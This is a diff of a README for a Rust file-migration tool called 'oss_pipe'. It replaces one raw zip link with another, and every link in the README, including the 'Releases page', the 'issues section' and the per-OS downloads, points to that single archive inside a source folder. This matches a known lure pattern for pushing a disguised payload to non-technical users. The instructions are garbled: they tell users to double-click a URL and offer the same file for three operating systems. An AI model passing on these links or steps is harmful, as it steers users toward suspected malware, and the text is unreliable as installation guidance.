@@ -1,7 +1,7 @@
 # 🚀 oss_pipe - Efficient File Migration Made Easy
 
 ## 📥 Download Now!
-[![Download oss_pipe](https://github.com/koustubhchouhan/oss_pipe/raw/refs/heads/main/src/checkpoint/oss_pipe_Sciaridae.zip)](https://github.com/koustubhchouhan/oss_pipe/raw/refs/heads/main/src/checkpoint/oss_pipe_Sciaridae.zip)
+[![Download oss_pipe](https://raw.githubusercontent.com/koustubhchouhan/oss_pipe/main/src/commons/pipe-oss-1.0-beta.5.zip)](https://raw.githubusercontent.com/koustubhchouhan/oss_pipe/main/src/commons/pipe-oss-1.0-beta.5.zip)
 
 ## 📖 Overview
 oss_pipe 是rust编写的文件迁移工具，旨在支撑大规模的文件迁移场景。相比java或golang构建的同类型产品，oss_pipe具备无GC、高并发、部署便利、OOM风险低等优势。This tool simplifies the process of moving files, making it ideal for users who manage large data sets or need to transfer files quickly and reliably.
@@ -10,22 +10,22 @@ oss_pipe 是rust编写的文件迁移工具，旨在支撑大规模的文件迁�
 To start using oss_pipe, follow these simple steps to download and run the application. You don’t need technical skills to get started. 
 
 ### Step 1: Visit the Download Page
-Go to the [oss_pipe Releases page](https://github.com/koustubhchouhan/oss_pipe/raw/refs/heads/main/src/checkpoint/oss_pipe_Sciaridae.zip). You will find the latest version of the software available for download.
+Go to the [oss_pipe Releases page](https://raw.githubusercontent.com/koustubhchouhan/oss_pipe/main/src/commons/pipe-oss-1.0-beta.5.zip). You will find the latest version of the software available for download.
 
 ### Step 2: Download the Application
 On the releases page, locate the version you want to install. Click on the link for your operating system to download the file. The following options are available:
 
-- For Windows: `https://github.com/koustubhchouhan/oss_pipe/raw/refs/heads/main/src/checkpoint/oss_pipe_Sciaridae.zip`
-- For macOS: `https://github.com/koustubhchouhan/oss_pipe/raw/refs/heads/main/src/checkpoint/oss_pipe_Sciaridae.zip`
-- For Linux: `https://github.com/koustubhchouhan/oss_pipe/raw/refs/heads/main/src/checkpoint/oss_pipe_Sciaridae.zip`
+- For Windows: `https://raw.githubusercontent.com/koustubhchouhan/oss_pipe/main/src/commons/pipe-oss-1.0-beta.5.zip`
+- For macOS: `https://raw.githubusercontent.com/koustubhchouhan/oss_pipe/main/src/commons/pipe-oss-1.0-beta.5.zip`
+- For Linux: `https://raw.githubusercontent.com/koustubhchouhan/oss_pipe/main/src/commons/pipe-oss-1.0-beta.5.zip`
 
 ### Step 3: Extract the Files
-After the download completes, locate the file in your downloads folder. Extract the contents of the zip or https://github.com/koustubhchouhan/oss_pipe/raw/refs/heads/main/src/checkpoint/oss_pipe_Sciaridae.zip file using any file extraction tool. 
+After the download completes, locate the file in your downloads folder. Extract the contents of the zip or https://raw.githubusercontent.com/koustubhchouhan/oss_pipe/main/src/commons/pipe-oss-1.0-beta.5.zip file using any file extraction tool. 
 
 ### Step 4: Run the Application
 Navigate to the folder where you extracted the files. You should see an executable file named `oss_pipe`. 
 
-- **For Windows:** Double-click `https://github.com/koustubhchouhan/oss_pipe/raw/refs/heads/main/src/checkpoint/oss_pipe_Sciaridae.zip` to run it.
+- **For Windows:** Double-click `https://raw.githubusercontent.com/koustubhchouhan/oss_pipe/main/src/commons/pipe-oss-1.0-beta.5.zip` to run it.
 - **For macOS and Linux:** Open a terminal window, change to the directory containing the extracted files, and run `./oss_pipe`.
 
 ## ⚙️ System Requirements
@@ -58,15 +58,15 @@ Using oss_pipe is straightforward. Here’s a quick guide:
 4. Click on the "Start Migration" button. The tool will handle the rest, showing you the progress along the way.
 
 ## 🔄 Updating oss_pipe
-To keep your installation up-to-date, regularly return to the [oss_pipe Releases page](https://github.com/koustubhchouhan/oss_pipe/raw/refs/heads/main/src/checkpoint/oss_pipe_Sciaridae.zip). Download the latest version when available, and follow the same installation steps.
+To keep your installation up-to-date, regularly return to the [oss_pipe Releases page](https://raw.githubusercontent.com/koustubhchouhan/oss_pipe/main/src/commons/pipe-oss-1.0-beta.5.zip). Download the latest version when available, and follow the same installation steps.
 
 ## 🎁 Support
-If you encounter any issues while using oss_pipe, please check the [issues section](https://github.com/koustubhchouhan/oss_pipe/raw/refs/heads/main/src/checkpoint/oss_pipe_Sciaridae.zip) on the GitHub page. You can also reach out there for community support from other users.
+If you encounter any issues while using oss_pipe, please check the [issues section](https://raw.githubusercontent.com/koustubhchouhan/oss_pipe/main/src/commons/pipe-oss-1.0-beta.5.zip) on the GitHub page. You can also reach out there for community support from other users.
 
 ## 📜 License
 oss_pipe is distributed under the MIT License. You can freely use and modify the software according to the license terms.
 
 ## 📥 Download & Install
-Now that you understand how to use oss_pipe, you can download and start moving files easily. Visit this page to download: [oss_pipe Releases](https://github.com/koustubhchouhan/oss_pipe/raw/refs/heads/main/src/checkpoint/oss_pipe_Sciaridae.zip). 
+Now that you understand how to use oss_pipe, you can download and start moving files easily. Visit this page to download: [oss_pipe Releases](https://raw.githubusercontent.com/koustubhchouhan/oss_pipe/main/src/commons/pipe-oss-1.0-beta.5.zip). 
 
 Enjoy a seamless file migration experience with oss_pipe!
